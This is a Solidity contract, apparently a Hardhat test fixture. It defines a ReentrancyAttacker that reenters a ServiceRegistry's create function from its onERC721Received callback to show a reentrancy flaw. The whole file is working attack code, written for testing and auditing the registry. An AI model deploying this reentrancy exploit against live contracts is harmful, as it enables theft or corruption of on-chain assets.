// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "hardhat/console.sol";

// ServiceRegistry interface
interface IServiceRegistry {
    /// @dev Creates a new service.
    /// @param serviceOwner Individual that creates and controls a service.
    /// @param description Description of the service.
    /// @param configHash IPFS hash pointing to the config metadata.
    /// @param agentIds Canonical agent Ids in a sorted ascending order.
    /// @param agentParams Number of agent instances and required required bond to register an instance in the service.
    /// @param threshold Signers threshold for a multisig composed by agent instances.
    /// @return serviceId Created service Id.
    function create(
        address serviceOwner,
        bytes32 description,
        bytes32 configHash,
        uint32[] memory agentIds,
        AgentParams[] memory agentParams,
        uint32 threshold
    ) external returns (uint256 serviceId);
}


// const service = await serviceRegistry.connect(serviceManager).create(owner, description, configHash,agentIds, agentParams, maxThreshold);
// This struct is 128 bits in total
struct AgentParams {
    // Number of agent instances. This number is limited by the number of agent instances
    uint32 slots;
    // Bond per agent instance. This is enough for 1b+ ETH or 1e27
    uint96 bond;
}

contract ReentrancyAttacker is IERC721Receiver {
    // Service Registry
    address public immutable serviceRegistry;

    address serviceOwner;
    bytes32 description;
    bytes32 configHash;
    uint32[] agentIds;
    AgentParams[] agentParams;
    uint32 threshold;

    constructor(address _serviceRegistry) {
        serviceRegistry = _serviceRegistry;
    }
    
    /// @dev wallet
    receive() external payable {
    }

    function create(
        address _serviceOwner,
        bytes32 _description,
        bytes32 _configHash,
        uint32[] memory _agentIds,
        AgentParams[] memory _agentParams,
        uint32 _threshold
    ) external returns (uint256 serviceId) {
        delete agentIds;
        for (uint256 i = 0; i < _agentIds.length; i++) {
            agentIds.push(_agentIds[i]);
        }
        for (uint256 i = 0; i < _agentParams.length; i++) {
            agentParams.push(_agentParams[i]);
        }
        serviceOwner = _serviceOwner;
        description = _description;
        configHash = _configHash;
        console.log("ReentrancyAttacker before create()"); 
        serviceId = IServiceRegistry(serviceRegistry).create(_serviceOwner,_description,_configHash,_agentIds,_agentParams,_threshold);
        console.log("ReentrancyAttacker call create() serviceId:",serviceId); 
    }

    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        uint256 serviceId;
        console.log("ReentrancyAttacker call onERC721Received()");
        console.log("serviceOwner:",serviceOwner);
        serviceId = IServiceRegistry(serviceRegistry).create(address(this), description, configHash, agentIds, agentParams, 6);
        console.log("ReentrancyAttacker inside onERC721Received after call create() serviceId:",serviceId); 
        return this.onERC721Received.selector;
    }
}